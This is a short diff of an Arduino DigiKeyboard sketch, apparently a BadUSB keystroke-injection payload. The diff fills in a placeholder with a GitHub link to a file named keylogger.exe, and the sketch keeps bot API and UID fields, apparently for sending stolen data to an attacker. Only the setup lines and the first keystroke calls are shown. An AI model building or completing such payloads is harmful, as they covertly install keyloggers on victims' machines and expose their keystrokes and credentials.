@@ -5,7 +5,7 @@ void setup() {}
 void loop() {
 	String BOTAPI = "API"
 	String UID = "UID"
-    String EXE = "EXE LINK"
+    String EXE = "https://github.com/SJAlanA/Key-Logger/blob/main/dist/keylogger.exe"
 
 	DigiKeyboard.sendKeyStroke(0);
 	DigiKeyboard.delay(100);
